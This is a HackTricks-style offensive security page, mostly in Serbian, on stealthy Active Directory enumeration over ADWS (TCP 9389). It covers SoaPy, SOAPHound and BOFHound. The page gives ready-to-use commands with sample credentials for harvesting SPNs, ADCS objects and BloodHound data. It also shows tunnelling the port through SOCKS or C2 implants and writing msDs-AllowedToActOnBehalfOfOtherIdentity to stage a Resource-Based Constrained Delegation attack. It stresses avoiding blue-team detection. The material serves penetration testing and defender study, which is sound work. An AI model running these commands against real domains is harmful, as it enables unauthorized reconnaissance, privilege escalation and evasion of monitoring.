# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## Šta je ADWS?

Active Directory Web Services (ADWS) je **podrazumevano omogućen na svakom Domain Controller-u od Windows Server 2008 R2** i sluša na TCP **9389**. Uprkos imenu, **HTTP nije uključen**. Umesto toga, servis izlaže podatke u LDAP stilu preko niza vlasničkih .NET framing protokola:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Pošto je saobraćaj enkapsuliran unutar ovih binarnih SOAP okvira i putuje preko neuobičajenog porta, **enumeracija preko ADWS-a je mnogo manje verovatno da će biti inspektovana, filtrirana ili prepoznata po potpisu nego klasični LDAP/389 & 636 saobraćaj**. Za operatere ovo znači:

* Diskretniji recon – Blue teams često fokusiraju na LDAP upite.
* Mogućnost prikupljanja sa hostova koji nisu Windows (Linux, macOS) tunelovanjem 9389/TCP preko SOCKS proxy-ja.
* Isti podaci koje biste dobili preko LDAP-a (users, groups, ACLs, schema, itd.) i mogućnost izvršavanja **writes** (npr. `msDs-AllowedToActOnBehalfOfOtherIdentity` za **RBCD**).

Interakcije sa ADWS-om se realizuju preko WS-Enumeration: svaki upit počinje sa `Enumerate` porukom koja definiše LDAP filter/atribute i vraća `EnumerationContext` GUID, nakon čega sledi jedna ili više `Pull` poruka koje streamuju do serverom definisanog prozora rezultata. Context-i isteknu posle ~30 minuta, pa alati moraju da paginiraju rezultate ili da razdvoje filtere (prefiks upiti po CN) da bi izbegli gubitak stanja. Kada tražite security deskriptore, navedite `LDAP_SERVER_SD_FLAGS_OID` kontrolu da izostavite SACL-ove, inače ADWS jednostavno uklanja `nTSecurityDescriptor` atribut iz svog SOAP odgovora.

> NAPOMENA: ADWS se takođe koristi od strane mnogih RSAT GUI/PowerShell alata, pa saobraćaj može da se stopi sa legitimnim administratorskim aktivnostima.

## SoaPy – Native Python klijent

[SoaPy](https://github.com/logangoins/soapy) je **puna reimplementacija ADWS protocol stack-a u čistom Pythonu**. Kreira NBFX/NBFSE/NNS/NMF frame-ove bajt po bajt, omogućavajući prikupljanje sa Unix-like sistema bez diraња .NET runtime-a.

### Ključne osobine

* Podržava **proxying through SOCKS** (korisno iz C2 implantata).
* Fino granulirani search filteri identični LDAP `-q '(objectClass=user)'`.
* Opcionalne **write** operacije (`--set` / `--delete`).
* **BOFHound output mode** za direktan unos u BloodHound.
* `--parse` zastavica za lepše formatiranje timestamps / `userAccountControl` kada je potrebna čitljivost za ljude.

### Ciljani flagovi za prikupljanje & write operacije

SoaPy dolazi sa odabranim prekidačima koji reprodukuju najčešće LDAP hunting zadatke preko ADWS-a: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, plus raw `--query` / `--filter` opcije za prilagođene pull-ove. Kombinujte ih sa write primitivima kao što su `--rbcd <source>` (postavlja `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging za ciljano Kerberoasting) i `--asrep` (flip `DONT_REQ_PREAUTH` u `userAccountControl`).

Primer ciljane SPN potrage koja vraća samo `samAccountName` i `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Koristite isti host/akredencijale da odmah iskoristite nalaze: izlistajte objekte koji podržavaju RBCD koristeći `--rbcds`, zatim primenite `--rbcd 'WEBSRV01$' --account 'FILE01$'` da postavite lanac Resource-Based Constrained Delegation (pogledajte [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) za kompletan put zloupotrebe).

### Instalacija (host operatera)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## SOAPHound – Prikupljanje velikog obima ADWS (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) je .NET alat za prikupljanje koji zadržava sve LDAP interakcije unutar ADWS i emitira BloodHound v4-kompatibilan JSON. Pravi kompletnu keš kopiju `objectSid`, `objectGUID`, `distinguishedName` i `objectClass` jednom (`--buildcache`), zatim je ponovo koristi za prikupljanje velikog obima pomoću `--bhdump`, `--certdump` (ADCS) ili `--dnsdump` (AD-integrated DNS), tako da iz DC-a izađe samo ~35 kritičnih atributa. AutoSplit (`--autosplit --threshold <N>`) automatski deli upite po CN prefiksu da ostane ispod 30-minutnog EnumerationContext timeout-a u velikim forest-ovima.

Tipični tok rada na operator VM-u pridruženom domeni:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Izvezeni JSON se direktno ubacuje u SharpHound/BloodHound workflows—see [BloodHound methodology](bloodhound.md) for downstream graphing ideas. AutoSplit čini SOAPHound otpornim na šume sa milionima objekata, pritom održavajući broj upita nižim nego kod ADExplorer-style snapshots.

## Stealth AD Collection Workflow

Sledeći workflow prikazuje kako enumerisati **domain & ADCS objects** preko ADWS, konvertovati ih u BloodHound JSON i tražiti puteve napada zasnovane na sertifikatima – sve sa Linuxa:

1. **Tunnel 9389/TCP** from the target network to your box (e.g. via Chisel, Meterpreter, SSH dynamic port-forward, etc.).  Export `export HTTPS_PROXY=socks5://127.0.0.1:1080` or use SoaPy’s `--proxyHost/--proxyPort`.

2. **Collect the root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Prikupite objekte vezane za ADCS iz Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Konvertuj u BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Upload the ZIP** u BloodHound GUI i pokrenite cypher queries kao što je `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` da otkrijete puteve eskalacije sertifikata (ESC1, ESC8, itd.).

### Upisivanje `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Kombinujte ovo sa `s4u2proxy`/`Rubeus /getticket` za potpun lanac **Resource-Based Constrained Delegation** (pogledajte [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Rezime alata

| Svrha | Alat | Napomene |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Can be proxied through same SOCKS |

## References

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
